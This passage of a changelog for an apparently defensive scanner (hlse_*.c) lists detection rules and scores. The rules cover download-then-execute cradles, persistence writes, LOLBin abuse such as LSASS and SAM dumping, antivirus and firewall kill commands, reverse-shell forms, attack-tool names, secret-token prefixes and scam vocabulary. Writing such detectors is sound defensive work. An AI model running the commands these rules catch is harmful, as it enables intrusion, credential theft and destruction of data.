  P15 — decode-then-pipe: base64 -d|-D|--decode or openssl enc
  piped to an interpreter (+45). P11 persistence writes now cover
  the whole autostart space: targets add .bash_profile/.bash_login/
  .zprofile/.zlogin/.xprofile/.pam_environment/ld.so.preload/
  cron.d/spool/cron/autostart/systemd/system/inetd/xinetd/
  /etc/profile/profile.d/init.d/.forward/.ssh/config//etc/zshrc/
  /etc/zprofile//etc/zshenv; write verbs add tee (path-gated),
  curl and wget (download-to-persistence-path); cp/mv/install
  fire only on system-level targets (cron.d, spool/cron,
  systemd/system, inetd, xinetd, init.d, /etc/profile, profile.d,
  ld.so, rc.local, autostart, authorized_keys) so home-dir
  backups stay clean. P12b chain side adds `; /`/`&& /`
  exec-by-absolute-path and rsync to the fetch set.

- **Package-manager remote installs + config mgmt + scheme/ext
  residuals**: paste adds the remote-install surface — installing
  from a non-registry source (URL/git+/local bundle) is exec of
  attacker bytes: npm|pnpm install|add|i and yarn|bun add|install
  with http/git+/file:/.tgz/.tar/.zip args; pip|pip3|pipx|poetry
  install/add or -r with http/git+/.whl/.zip/.tar; uvx http; gem
  install http|.gem; cargo install --git|--path|http; composer
  require http; apt|apt-get install .deb|http; dpkg -i .deb;
  rpm -i|-U, dnf|yum|zypper|brew|winget|choco|scoop install,
  pacman -U, xbps-install — all with http; apk add http|
  --allow-untrusted; snap install .snap|--dangerous; flatpak
  install http|.flatpakref|.flatpak; choco install .nupkg (+45
  all). Config-management remote exec: ansible-pull http,
  ansible-playbook http, ansible-galaxy install http|-r,
  ansible -m shell|command|raw, salt|salt-call cmd.run|
  cmd.shell|cmd.exec_code, puppet apply http, chef-client|
  chef-solo -r http, make -f http, at -f (+45 all). Schemes
  +30/+35/+40: apturl (Ubuntu package-install handler);
  echo/discard/time/qotd/motd (inetd-era dead protocols);
  bittorrent/thunder/flashget/qqdl (download managers);
  tiktok/snapchat/linkedin/pinterest/hipchat/gtalk (social
  deep-links); youtube/nflx/imdb/goodreads/flickr/yelp/waze/
  cast (media/local apps); paypal/revolut/usdc/venmo/cashapp/
  zelle/payoneer into URL_PAYMENT_SCHEMES (+40, payment-lure
  class — venmo/cashapp previously only +15 via keywords).
  Extensions +5: .tool/.oxt/.qpkg/.shtml/.shtm/.stm (SSI
  #exec)/.targets/.props/.user/.wixproj (MSBuild inline-task
  carriers)/.prg/.btm/.jsm/.mjs/.cjs/.jxa/.m/.psh/.wasm/
  .pyc/.pyo/.pyz/.pex/.shiv/.shivam.

- **Download-cradle completion** (`hlse_supply.c`): the
  download-then-execute surface had three holes — (1) `sh <(`/
  `bash <(`/`zsh <(` process-substitution script-feeds now
  satisfy the P12 eval side (`sh <(` substring-covers
  bash|zsh|ksh|dash|fish|wish); (2) new P12b catches
  `curl|wget x &&|;; bash|sh|chmod|sudo|./` — download-then-
  chain without a pipe or eval verb (+45); (3) the fetcher set
  grows beyond curl|wget: `fetch ` (FreeBSD), `lynx ` (text-
  browser fetch), `scp|sftp|tftp ` on the P12b chain side and
  `fetch|lynx` on the P2 pipe side. `cat <(curl`/plain scp/
  sftp/tftp fetch stay clean.

- **Attack-tool names + cloud/k8s/db primitives**
  (`hlse_supply.c`): paste adds name-gated attack tooling — the
  tool IS the signal: credential/lateral (mimikatz, lazagne,
  pwdump, fgdump, bloodhound[.py|-python|flag], sharphound,
  rubeus.exe|-, msfconsole, meterpreter, msfvenom, impacket,
  ntlmrelayx, secretsdump, getuserspns, getnpusers, psexec|svc,
  smbexec, wmiexec, atexec, dcomexec, crackmapexec, netexec,
  nxc), password/wireless (hashcat, john --, hydra +flag,
  aircrack/airodump/aireplay, wifite, reaver|fluxion +flag),
  recon (sqlmap, nikto/nmap +flag, masscan, nuclei, gobuster,
  ffuf, wpscan, enum4linux, smbmap, arp-scan, hping, tcpreplay,
  dirb, dirsearch, feroxbuster, dalfox), MitM (ettercap,
  bettercap, dsniff, mitmproxy, sslstrip, sslsplit, responder.py,
  mitm6), tunneling/C2 (ngrok, cloudflared, frpc/frps, ligolo,
  gost|chisel|rathole|iodine arg-gated, zrok, sshuttle, dnscat
  [2], dns2tcp, ptunnel, icmpsh/icmptunnel, iodined, proxychains,
  torsocks, tshd), privesc/exploit (linpeas, winpeas, linenum,
  mimipenguin, pspy, linux-exploit, dirtyc0w/dirtycow, pwnkit,
  ysoserial) — plus cloud exfil/exec (rclone copy|move|sync|lsd,
  aws s3 cp|sync|mv|rm, aws ssm send-command|start-session,
  gsutil cp|rsync|mv, azcopy copy|sync, az storage upload|
  download|copy + az run-command, gcloud compute ssh|scp), k8s/
  container exec (kubectl exec|cp|port-forward|apply|attach|run,
  helm install|upgrade, docker|podman|nerdctl exec|cp, crictl
  exec), and db/redis abuse (mysql -e, psql -c, redis-cli
  config|eval|slaveof|replicaof|module load, mongo|mongosh
  --eval) — all +45.

- **GTFOBins exec + destructive + pivot primitives**
  (`hlse_supply.c`): paste adds the Unix exec-through-flags set —
  tar --checkpoint-action|--use-compress, git -c core.pager|
  fsmonitor|sshCommand|hooksPath + ext:: transport, ssh -o
  ProxyCommand|LocalCommand, find -exec|-execdir, vi|vim|ex -c,
  man -P pager, expect spawn, tcpdump -z postrotate, split
  --filter, watch -x, emacs --eval, script -qc|-c (pty wrap),
  capsh --shell|--, tcc -run, jrunscript -e|-f, lua os.execute|
  io.popen, busybox applet exec/fetch, setsid detached exec —
  plus privilege/destructive primitives: pkexec, runuser -u,
  chroot +path, chsh -s, passwd -l|-d, chpasswd, journalctl
  --vacuum + dmesg -c (journal wipe), mknod, insmod, rmmod|
  modprobe -r of iptable|nf_|apparmor|selinux (security module
  unload), kill -9 -1, init|telinit 0|6, printenv (env dump) —
  and network pivot: ip_forward=1, ip route|route add|replace,
  iptables -t nat|masquerade|dnat (added to the flush gate),
  date -s|--set, timedatectl set-time|set-ntp, mount -t
  cifs|nfs|smb + mount.cifs + sshfs, ncat --listen (added to
  P13), lxc|incus exec — all +45 arg-gated.

- **macOS post-compromise primitives** (`hlse_supply.c`): paste
  adds the Darwin-side attack set that was completely open —
  launchctl persistence (bootstrap|submit|kickstart|load|
  enable), Gatekeeper off (spctl --master-disable|--add|
  --disable), quarantine strip (xattr +quarantine|-rc|-c),
  keychain credential access (security find-generic|find-
  internet-password|export|unlock|dump-keychain), directory-
  service account writes (dscl -create|-append, pwpolicy
  -setpassword, dseditgroup -o edit|-a), package install
  (installer -pkg, pkgutil --expand|--forget|--install),
  persistence plist writes (defaults write +loginitems|
  autolaunched|launchagents|launchdaemons), SIP off (csrutil
  disable|--without), traffic redirect (networksetup
  -set*proxy|-setdnsservers), pf enable/ruleset load (pfctl
  -e|-f), remote access enable (systemsetup remotelogin|
  remoteappleevents|wakeonnetworkaccess +on), TCC reset
  (tccutil reset), signature strip/adhoc sign (codesign
  --remove-signature|--sign -|-s -), kext load (kextload,
  kmutil load), mobileconfig install (profiles install),
  log erase, qlmanage -p (Quick Look plugin exec), tmutil
  delete, plutil -replace|-insert, nvram boot-args,
  sysdiagnose -f, xcrun swift|swiftc, osascript JavaScript
  (JXA payloads) — all +45 arg-gated.

- **Unix post-compromise primitives** (`hlse_supply.c`): paste
  adds the Linux/macOS-side attack set that was completely open —
  uid-0 account grant (`useradd`/`adduser`/`usermod` + `-u 0`|
  `--uid 0`|`-ou`|`-aG sudo|wheel`), SELinux/audit kill
  (`setenforce 0`, `auditctl -d|-D`, auditd stop/disable/kill),
  shell-history wipe (`history -c`, `unset HISTFILE`,
  `HISTFILE=/dev/null`, rm|truncate|shred .bash_history),
  firewall flush (`iptables`/`ip6tables` -f|-x|flush, `nft
  flush`, `ufw disable`, `pfctl -d`, `firewall-cmd` add-port|
  add-service|direct|panic), ssh tunneling (`ssh`/`autossh` +
  `-r `|` -d `|`-nf`|`-fn` — reverse tunnel / dynamic SOCKS /
  background no-command; `-L` stays unflagged since ci cannot
  split it from `-l` login), sudoers append (`sudoers` +
  nopasswd|>>|tee), namespace/container escape (`systemd-run`
  exec flags, `nsenter` -t|-m|-p|-n, `unshare` userns/net/pid,
  `docker` --privileged|-v /:|host-net-pid), decoder+exec
  (`xxd -r`), attribute tamper (`chattr -i|+i`), `wipefs`,
  priv-esc recon (`find -perm`+4000|2000|u=s, `getcap -r`),
  ptrace attach (`gdb|strace|ltrace`+-p), TLS/decrypt channel
  (`openssl s_client`|`enc -d`), `awk system()`, `xclip -o`
  — all +45 arg-gated.

- **Installer carriers + IDE/Shortcuts schemes + gift-card/LE
  scam vocab** (`hlse_file.c`, `hlse_core.c`, `hlse_text.c`):
  EXECUTABLE_EXTS gains the exec-capable installer set that was
  missing — `.apk`/`.aab`/`.ipa` (mobile sideload; the
  .xapk/.apks/.apkm splits were already listed but the base
  .apk was not), `.deb`/`.rpm` (system installers: maintainer
  scripts run as root), `.AppImage`, `.vsix`/`.crx`/`.xpi`/`.oex`
  (browser/editor extension packages — code runs under the host
  app's trust), `.xap`/`.clickonce`/`.air`/`.ins`/`.shar`/`.ear`
  (Silverlight, ClickOnce manifest, AIR installer, IE
  connection-settings, self-extracting shell archive, Java EAR).
  Schemes gain `cursor:`/`windsurf:`/`zed:`/`jetbrains:`/
  `visualstudio:`/`xcode:` (IDE deep-links — the
  vscode://file/ siblings), `tv:`, and `shortcuts:`/`workflow:`
  (run-shortcut?name= executes an installed iOS automation —
  action-exec, not just app-open). Text FAKE_ALERT vocab gains
  the gift-card payment channel (code/scratch/read-back
  phrasings — bare store-card names stay unflagged: they are
  legitimate gift talk), western-union/moneygram transfer rails,
  and law-enforcement impersonation (dea/irs agent|officer,
  badge number|id, warrant-for-arrest, sheriff department).

- **EP-bypass + reg-save hive dump + AV/EDR kill + install
  primitives** (`hlse_supply.c`): paste adds —
  `powershell`/`pwsh` + `-ep|-ex|-exec|-executionpolicy` +
  `bypass|unrestricted` (the signature ExecutionPolicy bypass the
  -enc/-w-hidden gates did not cover; `-ep remotesigned` stays
  clean — that is the default safe policy); `reg save` +
  `\\sam|\\security|\\system` (SeBackupPrivilege hive dump —
  regedit /e was already caught, the CLI form was not);
  AV/EDR kill — `sc|net|net1|taskkill|tskill` + stop|delete|
  config|/f|/im|start=dis + 20 product names (windefend,
  msmpeng, wdnissvc, wscsvc, securityhealthservice, avast,
  malwarebytes, sentinelagent, sophos, savservice, mcshield,
  ekrn, csfalcon, csagent, crowdstrike, elastic-endpoint,
  sharedaccess, ...); `netsh` + advfirewall|firewall +
  state off|opmode disable|allowedprogram|portopening and
  `netsh add helper` (helper-DLL load); `reagentc /disable`
  (kills Windows RE — ransomware recovery-prep); `wbadmin` +
  `delete` (backup/catalog destruction); `dism add-package`,
  `pkgmgr /iu`, `ocsetup`+arg, `certmgr -add` (cert-store
  install), `msxsl`+xsl|xml (script-let exec), `makecab`+payload
  ext, `tscon`+/dest (session hijack), `arp -s` (static-ARP
  poison), `sc sdset`+`D:` (SDDL tamper) — all +45 arg-gated.

- **.NET compile chain + rundll32 DLL targets + scam vocab**
  (`hlse_supply.c`, `hlse_text.c`): paste adds the on-host build
  primitives — `csc`/`vbc`/`jsc`+src|/out|/target (compile
  payload to exe/dll), `ilasm`+.il|/exe|/dll|/output, `resgen`+
  txt|resx|resources, `aspnet_compiler`+args, `certreq`+-new|
  .inf|.csr (cert mint for C2 signing), `diaghub`+/|.dll
  (unsigned-DLL load), `desktopimgdownldr`+/|http,
  `wlrmdr`+-o|-f|.exe — all +45 arg-gated, bare names OK.
  rundll32 proxy-exec DLL targets now flag by exported-function
  name: `FileProtocolHandler`, `RouteTheCall`,
  `ShellExec_RunDLL`, `OpenAs_RunDLL`, `LaunchINFSection`
  (url.dll OpenURL was already caught by the http gate). Text
  gains +30 FAKE_ALERT vocab — `bitcoin/btc/crypto atm` (the
  FTC-documented cash-to-crypto payment channel),
  `voice clone`/`voice cloning`/`voice has been cloned`/
  `cloned your|my voice` (AI voice-clone vishing),
  `whatsapp|telegram`+`investment|trading` (pig-butchering
  funnel), `cash app flip`/`cashapp flip`.

- **net1 evasion + UAC-bypass/TAEF LOLBAS wave + secrets wave-7**
  (`hlse_supply.c`, `hlse_secrets.c`): the four net-* rules now
  also match `net1`/ `net.exe` — the documented aliases attackers
  run to dodge 'net ' command monitoring (same arg gates:
  user|localgroup+/add, share+=, use+\\); `reg add`+`ms-settings`
  joins the persistence-write set (the fodhelper/class
  UAC-bypass registry trick); new +45 arg-gated entries —
  `runscripthelper`+UNC|exe|bat|dll|ps1 (WSUS postinstall exec),
  `te.exe`+dll|wsc|xap (TAEF harness exec),
  `presentationhost`+http|.xbap|UNC (remote .xbap fetch+run),
  `replace`+system32|syswow64 (write-into-system primitive) —
  bare names stay OK. Secrets gains `sgp_` (Segment), `re_`
  (Resend), `dbtc.` (dbt Cloud), `tr_dev_`/`tr_stg_`/`tr_prod_`
  (Trigger.dev env-scoped), `hex_` (Hex.pm), `akab-` (Akamai
  EdgeGrid), `pub-c-`/`sub-c-`/`sec-c-` (PubNub keyset),
  `hvl.` (Vault login token — completes the hvs./hvb./hvr.
  family), `hcaik_`/`hcxik_`/`hcxmk_` (Honeycomb).

- **Registry-persistence + LOLBAS wave-7 + secrets wave-6**
  (`hlse_supply.c`, `hlse_secrets.c`): paste adds +45 arg-gated
  entries — `ieexec`+http|.exe|.dll (remote .NET exec),
  `infdefaultinstall`+.inf ([DefaultInstall] payload),
  `msdeploy`+-verb:|-source:|-dest: (Web Deploy command run),
  `rasdial`+.pbk|/phonebook (attacker phonebook dial),
  `regedit`+(/s|.reg) registry import, `regedit /e`+SAM|
  SECURITY|SYSTEM hive export (credential theft — '/e ' is
  excluded from the import gate so benign HKCU exports stay
  OK), `reg add`/`reg.exe add`+currentversion\run|image file
  execution|silentprocessexit|winlogon+shell|userinit (the
  classic autostart/IFEO persistence write), `winrs`+-r:
  (remote shell), `tttracer`+-out|-dump|.exe|.dll and
  `ttdinject`+/dll|.dll|/commandline (TTD trace/inject
  primitives) — bare help/query/name forms stay OK. Secrets
  gains `rubygems_`, `nvapi-`, `pnu_`, `apify_api_`, `pul-`,
  `pat-na`/`pat-eu` (HubSpot private-app PAT), `cqt_`/`ckey_`,
  AWS STS session prefixes `FQoGZXIvYXdz`/`FwoGZXIvYXdz`/
  `AQoDYXdz`, Amazon LWA `Atza|`, Webex `Y2lzY29zcGFyazovL`,
  Braintree `access_token$production$`/`$sandbox$` (the '$'
  breaks the tail charset, so env-qualified prefixes gate),
  and generic `sk-`+32 (DeepSeek / legacy OpenAI-class).

- **LSASS-dump + account/exfil LOLBin wave** (`hlse_supply.c`):
  `procdump`/`procdump64`+lsass|-ma and `comsvcs`+minidump (the
  LSASS credential-dump primitives), `tsecimp`+-f (TAPI XML
  exec), `microsoft.workflow.compiler`+xoml|cs|xml, `pnputil`+
  -i|-a|.inf (BYOVD driver install), `net user`/`net localgroup`
  +/add and `net share`+= and `net use`+\\ (account/lateral set),
  `ftp`+-s: script exec, `iexpress` self-installer build, and
  `robocopy`+\\ remote-share exfil — all +45, arg-gated so bare
  help/query forms stay OK.

- **Credential-store filenames + ntdsutil LOLBin wave + robocall
  vocab** (`hlse_file.c`, `hlse_supply.c`, `hlse_text.c`):
  `.git-credentials`/`.my.cnf`/`.s3cfg`/`id_rsa`/`id_dsa`/
  `id_ecdsa`/`id_ed25519`/`authorized_keys` join the +45
  basename rule — names that ARE the credential store by
  definition (files that only may hold creds — .netrc/.pgpass/
  .ovpn — stay content-gated by the existing F56 family); paste
  adds `ntdsutil`+snapshot|ifm|ac-i-ntds (ntds.dit domain
  credential dump — the highest-value Windows LOLBin),
  `pubprn`/`printui` remote proxy exec, `verclsid`+/s CLSID
  exec, `runonce`+alternateshellstartup, `settingsynchost`+
  -load*, `sc create|config`+binpath|obj service persistence,
  `control`+.cpl applet load, `findstr`+"" whole-file read; text
  gains `cardholder services` (FTC's #1 robocall signature),
  `settle your debt`, `repair your credit`, `credit score
  dropped` (debt-relief/credit-repair families).

- **JNDI remote-lookup schemes + ransomware-prep LOLBin wave**
  (`hlse_core.c`, `hlse_supply.c`): `jndi:`/`rmi:`/`iiop:`/
  `corba:`/`corbaloc:`/`corbaname:`/`dns:`/`nis:`/`nds:`/`nio:`/
  `t3:`/`t3s:` join the legacy-transport table (+30) — the lookup
  channels a `${jndi:X://attacker}` Log4Shell payload resolves;
  the text-level `${jndi:…}` form was already BLOCKed, the bare
  URI operand now flags too. Paste adds +45 arg-gated entries for
  the ransomware pre-encryption set: `icacls /deny` (admin
  lockout), `takeown`+/r|/d, `cipher /w` (free-space wipe),
  `fsutil`+usn (USN journal wipe), `manage-bde`+-off|-disable
  (BitLocker kill), `diskpart`+/s (scripted volume ops, wiper
  class), `secedit`+/configure|/import, `rasphone`+-d|.pbk, and
  `schtasks`+/create only when /ru|/rl|/xml is present (bare
  task creation stays OK).

- **Ransomware-prep LOLBins + 419/flip/drainer vocab**
  (`hlse_supply.c`, `hlse_text.c`): `bcdedit` (/set, safeboot,
  recoveryenabled — boot/recovery tampering), `wevtutil cl`/
  `clear-log` (anti-forensic event-log wipe), `wusa`+.msu (Fin7
  package-install vector), `netsh`+portproxy (C2 tunnel),
  `cmdkey`+/add|/list (stored-credential planting/enumeration),
  `dnscmd`+plugin|/config (serverlevelplugindll / WPAD),
  `wsl`+(-e|-c|.sh|bash) (WSL EDR-evasion execution), `certoc`+arg
  (cert-store DLL loading) — all +45, arg-gated so bare
  enumeration/prose stays OK; text gains `advance fee` (canonical
  419 name), `irs tax relief` (third-party relief scammers on the
  IRS brand), `cash flip` (Instagram/Zelle money-flip), `migrate
  your wallet` (drainer migration lure).

- **DevOps-secret formats + TNEF/emlx carriers + medicare/recovery
  vocab** (`hlse_secrets.c`, `hlse_file.c`, `hlse_text.c`): `st.`
  (Infisical service token — `st.<uuid>.<key>`), `MC5.` (Prismic),
  `FlyV1 fm2_` (Fly.io), `cu_` (Checkly), `aio_` (Adafruit IO),
  `motherduck_`, `dsp_` (DeepSource); `.emlx` (Apple Mail sibling
  of `.eml`) and `.tnef`/`winmail.dat` (TNEF blobs embed whole
  attachments, executables included, opaque to gateway scanners)
  message carriers +30; text gains Medicare impersonation
  (`new medicare card`, `medicare number`), recovery-scam services
  (`funds recovery`, `recover your losses`) and
  student-loan `forgiveness application`/`forgiveness processing
  fee` vocab — benign medicare/recovery prose stays OK.

- **Data-platform secrets + credential/mail/systemd stores**
  (`hlse_secrets.c`, `hlse_file.c`): `pcsk_` (Pinecone), `xau_`
  (Xata), `esecret_` (Anyscale), `xaat-` (Axiom), `AQVN` (Yandex
  OAuth), `pdl_live_`/`pdl_sbox_` (Paddle); credential stores
  `.psafe3` (Password Safe), `.enpass` (Enpass), `.1pif` (1Password
  plaintext interchange export), `.skr` (GnuPG secret keyring) and
  mailbox stores `.pst`/`.ost`/`.dbx`/`.mbox` join the
  secret-container rules (ext + basename → 75); systemd units
  `.service`/`.timer`/`.socket` (ExecStart persistence primitive)
  and `.caction` (Automator calendar action — fires on calendar
  events) extension-flagged +30.

- **CI/CD-secret formats + paste LOLBin wave-2 + refund/Quick Assist
  vocab** (`hlse_secrets.c`, `hlse_supply.c`, `hlse_text.c`):
  `bkua_` (Buildkite user token), `wandb_v1_` (Weights & Biases),
  `sha256~` (OpenShift OAuth token); LOLBin detections for
  `mpcmdrun -DownloadFile`, `odbcconf /f|.rsp`, `ie4uinit -`/
  `-BaseSettings`, `ieadvpack /r`, `rasautou -f`, `mavinject`+dll,
  `expand`/`extrac32`/`diantz`/`extexport`+remote, `SyncAppvPublishingServer`,
  `wbadmin`+UNC, `finger`+`@`, `regini`+`.ini` — all arg-gated
  (bare invocations and prose mentions stay OK); text gains
  `quick assist code`/`open quick assist`/`use quick assist`
  (Microsoft's spaced product name — top 2024-25 tech-support lure)
  and `accidentally refunded` (overpayment-refund script signature).

- **ms-* launcher schemes + `.ica` + JP delivery phrasing**
  (`hlse_core.c`, `hlse_file.c`, `hlse_text.c`): `ms-onenote:` (the
  OneNote lure family's dedicated launcher), `ms-outlook:`,
  `mso-offcrypto:` and the `ms-remotedesktop:`/`ms-rd:`/
  `ms-remotedesktop-launchrcc:` RDP-client family join the handler
  table (+35); `.ica` (Citrix connection file — `.rdp`'s sibling)
  extension-flagged +30; `お届けにあがり`/`ご不在のためお届け`
  courier-exclusive missed-delivery phrasing joins the JP smishing
  array (持ち帰り takeout prose stays OK).

- **`safari-extension:` + `samsungpay:`** (`hlse_core.c`): the
  extension-resource sibling joined the wrapper table AND the
  is-url-like predicate (the table alone wasn't consulted for
  `x://y` operands — both sites must carry new schemes);
  `samsungpay:` joins the payment table (+40).

- **DB/broker connection-string schemes** (`hlse_core.c`): +30
  fetch class (BLOCK 70 with embedded `user:pass@`) — postgres/
  postgresql/postgres+SQLAlchemy, mysql, mariadb, mongodb(+srv),
  redis/rediss, amqp/amqps, couchdb, cassandra, neo4j, bolt,
  influxdb, clickhouse, elasticsearch, opensearch, etcd,
  zookeeper/zk, kafka, nats, grpc(s), smtp. These URIs routinely
  embed credentials — the leak channel was uncovered.

- **Crypto payment + wallet deep-link schemes** (`hlse_core.c`):
  payment table (+40) gains `solana:`, `bitcoincash:`, `ripple:`,
  `xrpl:`, `stellar:`, `cardano:`, `dash:`, `zcash:`, `eip681:`,
  and `wc:`/`walletconnect:` — the WalletConnect pairing URI is
  the literal drainer session primitive. Handler table (+35)
  gains wallet-app openers `metamask:`, `trust:`, `phantom:`,
  `rainbow:`, `coinbase:`, `binance:`, `exodus:`, `atomic:`,
  `ledgerlive:`.

- **Task-scam vocabulary + regsvcs/ncat primitives**
  (`hlse_text.c`, `hlse_supply.c`): `like videos to earn`,
  `rate apps to earn`, `daily task quota` (narrowed from
  `task quota` — quarterly quotas are legit corporate prose),
  `merchant task`, `earn per click`. P8 gains `regsvcs.exe`
  (regasm sibling, +45 on .dll/.exe/http args) and the
  `ncat --exec`/`--sh-exec` reverse-shell forms (+60) that
  slipped the ` -e `-only matcher.

- **MFA-fatigue residual + IVR callback-scam vocabulary**
  (`hlse_text.c`): `tap approve`, `approve this request`, and
  the vishing hook `press 1/one to speak|authorize|cancel` —
  `press 1 to confirm your appointment` (legit reminder) stays
  clean.

- **`pscale_oauth_` + `AVNS_` secrets** (`hlse_secrets.c`):
  PlanetScale OAuth token (the `tkn_`/`pw_` siblings were
  covered) and Aiven access token — both +85.

- **`ms-teams:`/`evernote:`/`miro:` app handlers**
  (`hlse_core.c`): +35 — `ms-teams:` is the dashed sibling of
  `msteams:` (IANA-registered, meeting-link lures); Evernote and
  Miro join the app deep-link family.

- **`sntryu_` Sentry user auth token** (`hlse_secrets.c`): +85 —
  the `sntrys_` org-token sibling was covered but `u` (user
  auth) slipped the `s` prefix.

- **Dying-widow inheritance vocabulary** (`hlse_text.c`):
  `donate my inheritance`, `bequeath my estate` — first-person
  bequest phrasing unique to the charity-scam script; third-
  person legal use (`bequeath the estate to the heirs`) stays
  clean.

- **`ls__` LangSmith legacy token** (`hlse_secrets.c`): +80,
  joins the `lsv2_pt_`/`lsv2_sk_` family.

- **Sextortion capability-claim vocabulary + LOLBins**
  (`hlse_text.c`, `hlse_supply.c` P8): the attacker's own
  ownership claims in extortion scripts — `password was
  captured`, `infected you with`, `your contacts will receive`,
  `device was compromised`, `i know what you visited`. LOLBin
  additions: `hh.exe` with a remote/CHM target (HTML Help exec),
  `cmstp /s` (INF profile exec / UAC bypass), `xwizard` and
  `appvlp`+URL (proxy execution), and `cscript`/`wscript`
  `//e:` (script-engine extension bypass — runs .txt payloads
  as JScript/VBScript).

- **`.ppkg` carrier + `cap:` handler** (`hlse_file.c`,
  `hlse_core.c`): Windows provisioning packages (`.ppkg`) install
  certs/Wi-Fi/MDM enrollment — the Windows twin of `.mobileconfig`
  lures (+30 LOG); `cap:` is the RFC 4324 Calendar Access
  handler (+35 LOG).

- **IRS/legal-threat impersonation vocabulary** (`hlse_text.c`):
  `badge number` (impostor script opener — legitimate callers
  never announce one), `case against your name`, `legal case
  filed`, `to arrest you`, `avoid prosecution`, and `from the tax
  department` join the legal-threat impersonation set; the tax-
  department form is the "calling from" context only, so ordinary
  mentions stay clean.

- **SonarQube/LaunchDarkly/GitLab token formats + password-store
  carriers** (`hlse_secrets.c`, `hlse_file.c`): `sqa_`/`sqp_`/`squ_`
  SonarQube token family (+80), LaunchDarkly `sdk-`/`mob-` client
  keys (+70), and `glffct-` GitLab feature-flag client token (+75)
  join the prefix table. `.kdbx` (KeePass), `.agilekeychain`/
  `.opvault` (1Password), `.keychain` (macOS) and `.wallet`
  (Multibit) are credential-store artifacts — exfiltration targets
  and harvest lures — now flagged +30 LOG.

- **Pig-butchering tax/certificate demand vocabulary**
  (`hlse_text.c`): `tax to withdraw`/`tax on your withdrawal`
  close the exit-scam phrasing gap next to `tax fee to withdraw`,
  and the fake-certificate demands (`anti-terrorism certificate`,
  `anti-money laundering certificate`, `aml certificate`) —
  classic advance-fee extraction asks with no legitimate consumer
  use. Ordinary tax speech stays clean.

- **PDF `/URI` auto-navigation + Apple profile/Wallet carriers**
  (`hlse_file.c` F16): `/OpenAction` or `/AA` combined with a
  `/URI` action is auto-navigation to a remote URL on open — the
  no-JavaScript PDF phishing tripwire — now scored 65 (a bare
  `/URI` link annotation stays clean). `.mobileprovision` joins the
  flagged carrier set (+30 LOG): a bare provisioning profile is an
  enterprise-sideload install lure — legitimate distribution embeds
  it inside the `.ipa`. (`.mobileconfig` deliberately stays
  extension-clean: the F36 content rule already flags root-CA
  profiles while managed-WiFi profiles stay OK; `.pkpass` is a
  high-volume legitimate carrier.)

- **`ms-cxh`/`ms-contact-support:` handlers + `.osdx` carrier**
  (`hlse_core.c` handler table, `hlse_file.c`): `ms-cxh` (bare
  prefix — covers `ms-cxh:` and `ms-cxh-full:`) is the Cloud
  eXperience Hub / OOBE handler abused through provisioning
  paths, `ms-contact-support:` hands the URI to the support
  assistant, and `.osdx` (OpenSearch description) is the file
  a `.searchconnector-ms` lure installs from (+35/+30 LOG).

- **Paste LOLBin coverage — esentutl/desktopimgdownldr/syncappv**
  (`hlse_supply.c` P8): `esentutl /y` (copy primitive — locked-file
  and alternate-data-stream exfiltration), `desktopimgdownldr`
  with `/lockscreenurl:` (LOLBAS download primitive that fetches a
  remote file through the lockscreen handler), and
  `syncappvpublishingserver` with a `";` injection argument (App-V
  publish LOLBin whose trailing payload executes). Benign forms
  (`esentutl /r`, `syncappvpublishingserver "v"`) stay clean.

- **`SSWS` Okta legacy API token** (`hlse_secrets.c`): the
  `SSWS <43>` auth-scheme header form — a leaked one is
  full-tenant admin (+90).

- **Impersonation greetings + sign-in alert lures**
  (`hlse_text.c`, vocab): `dear beneficiary`,
  `dear account holder`, `dear valued customer`,
  `attention account holder` (mass-phish address forms),
  `kindly confirm/update/verify/provide` (the 'kindly' scam
  register — 'kindly note' stays clean), `unusual sign-in`,
  `sign-in attempt` (fake account-alert lures), and
  `attached payment`, `attached receipt`, `open the attachment`
  (payload-naming click lures; 'see attached report' stays
  clean). Single hits keep the LOG band and compound with
  urgency/verify signals.

- **Certificate-store carriers** (`hlse_file.c`): `.sst`
  (serialized certificate store), `.spc` (Authenticode software
  publisher certificate), `.crl` (revocation list) join the
  CERTS family — installing one is the MITM primitive (+30).
- **LOLBin residuals** (`hlse_supply.c`, paste): `pcalua`
  program-launch and `control.exe <name>.cpl` CPL payload loads —
  bare `control userpasswords2` and plain `pcalua <app>` stay
  clean (+45).

- **Apple media/store handlers + `cydia:`** (`hlse_core.c`):
  `itms-books:`, `applestore:`, `ibooks:`, `music:`, `videos:` —
  the remaining Apple app deep-link family beside
  `itms-apps:`/`macappstore:`; `cydia:` hands a package spec to a
  jailbreak store client (+35 each).
- **Secret pattern residuals** (`hlse_secrets.c`): Dynatrace
  `dt0c01.`/`dt0s16.` (`<id>.<secret>` dotted API tokens),
  Samsara `sams_`, and Gitea `gitea_` + hex — all previously
  scored OK on a live credential format (85 each).

- **`web+`/`fediverse:`/`nostr:`/`ventrilo:` handlers**
  (`hlse_core.c`): the `web+` prefix catches every
  registerProtocolHandler custom scheme (a click hands the URL to
  the registering origin); `fediverse:`/`nostr:` are ActivityPub
  and Nostr entity deep links; `ventrilo:` is the
  `mumble:`/`ts3server:` voice-connect sibling (+35 each).
- **Raw transport references** (`hlse_core.c`): `tcp:`, `udp:`,
  and `sctp:` mark non-HTTP fetch destinations, same class as the
  `ws:`/`daytime:`/`chargen:` entries (+30 each).

- **`vsls:`/`ms-callto:` scheme handlers** (`hlse_core.c`):
  VS Live Share deep links join an attacker-hosted collaborative
  session on click (code-share lure); `ms-callto:` is the prefixed
  `callto:` alias the comms table missed (+35 each).
- **Drainer vocabulary residuals** (`hlse_text.c`, BAIT):
  `rectify wallet`, `synchronize your wallet`,
  `wallet synchronization`, `connect dapps`, `dapps connect`,
  `bridge your tokens`, `validate wallet`, `sync your tokens`,
  `restore wallet access`, `claim tokens` — fake
  wallet-validation/drain-site wording. Phrase-level entries, so
  'WalletConnect' and 'rectify an error' stay clean; a lone hit
  keeps OK while compounding with urgency/claim signals.

- **Paste cradle residuals** (`hlse_supply.c`): `iwr|iex`,
  `irm|iex`, and `iex(iwr ...)` — the PowerShell download-execute
  cradle — fired only when the literal word "powershell" appeared
  in the paste, which real ClickFix payloads omit (+45).
  `curl|wget` piped to `python`/`perl`/`node`/`ruby`/`php`/
  `pwsh`/`powershell`/`zsh`/`fish`/`dash`/`ksh` joins the
  pipe-to-shell class (+40). Package installs repointed at an
  alternate index — `--index-url`, `--extra-index-url`,
  `--registry`, `--source` on pip/pip3/pipx/npm/pnpm/yarn/gem —
  flag +45 as the dependency-confusion delivery channel.
  Plain `pip install` and the Elixir `iex` shell stay clean.

- **F5c: remote icon reference in shell-shortcut content**
  (`hlse_file.c`): `IconFile=`/`IconResource=` pointing at
